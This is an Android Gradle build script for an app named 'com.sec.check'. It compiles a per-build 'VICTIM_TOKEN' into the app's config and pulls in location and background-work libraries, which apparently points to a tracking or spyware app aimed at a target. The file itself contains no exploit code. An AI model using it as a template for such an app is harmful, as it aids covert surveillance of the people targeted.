plugins {
    id 'com.android.application'
}

// ============================================
// Auto-increment version code
// ============================================
def getVersionCode() {
    // لو فيه ENV → استخدمه (من GitHub Actions)
    if (System.getenv("BUILD_NUMBER")) {
        try {
            return Integer.parseInt(System.getenv("BUILD_NUMBER"))
        } catch (Exception e) {}
    }
    
    // وإلا زوّد 1 عن آخر مرة
    def versionFile = file('../version.properties')
    if (versionFile.exists()) {
        def props = new Properties()
        versionFile.withInputStream { props.load(it) }
        def code = (props.getProperty('VERSION_CODE') ?: '1') as Integer
        code += 1
        return code
    }
    return 1
}

def getVersionName() {
    def versionFile = file('../version.properties')
    if (versionFile.exists()) {
        def props = new Properties()
        versionFile.withInputStream { props.load(it) }
        return props.getProperty('VERSION_NAME') ?: '1.0.0'
    }
    return '1.0.0'
}

def victimTokenValue = "DEFAULT_TOKEN"
if (project.hasProperty('victimToken')) {
    victimTokenValue = project.property('victimToken')
}
if (System.getenv("VICTIM_TOKEN")) {
    victimTokenValue = System.getenv("VICTIM_TOKEN")
}

println "BUILDING WITH VICTIM_TOKEN = ${victimTokenValue}"
println "VERSION CODE = ${getVersionCode()}"
println "VERSION NAME = ${getVersionName()}"

android {
    namespace 'com.sec.check'
    compileSdk 33

    defaultConfig {
        applicationId "com.sec.check"
        minSdk 23
        targetSdk 33
        versionCode getVersionCode()      // ← تلقائي
        versionName getVersionName()      // ← تلقائي
        buildConfigField "String", "VICTIM_TOKEN", "\"${victimTokenValue}\""
    }

    buildFeatures {
        buildConfig true
    }

    buildTypes {
        release {
            minifyEnabled false
            buildConfigField "String", "VICTIM_TOKEN", "\"${victimTokenValue}\""
        }
        debug {
            buildConfigField "String", "VICTIM_TOKEN", "\"${victimTokenValue}\""
        }
    }

    compileOptions {
        sourceCompatibility JavaVersion.VERSION_1_8
        targetCompatibility JavaVersion.VERSION_1_8
    }

    configurations.all {
        resolutionStrategy {
            force 'org.jetbrains.kotlin:kotlin-stdlib:1.8.10'
            force 'org.jetbrains.kotlin:kotlin-stdlib-jdk7:1.8.10'
            force 'org.jetbrains.kotlin:kotlin-stdlib-jdk8:1.8.10'
        }
    }
}

dependencies {
    implementation 'androidx.appcompat:appcompat:1.6.1'
    implementation 'androidx.core:core:1.10.1'
    implementation 'androidx.work:work-runtime:2.8.1'
    implementation 'androidx.preference:preference:1.2.0'
    implementation 'com.google.android.gms:play-services-location:21.0.1'
    implementation 'org.jetbrains.kotlin:kotlin-stdlib:1.8.10'
}
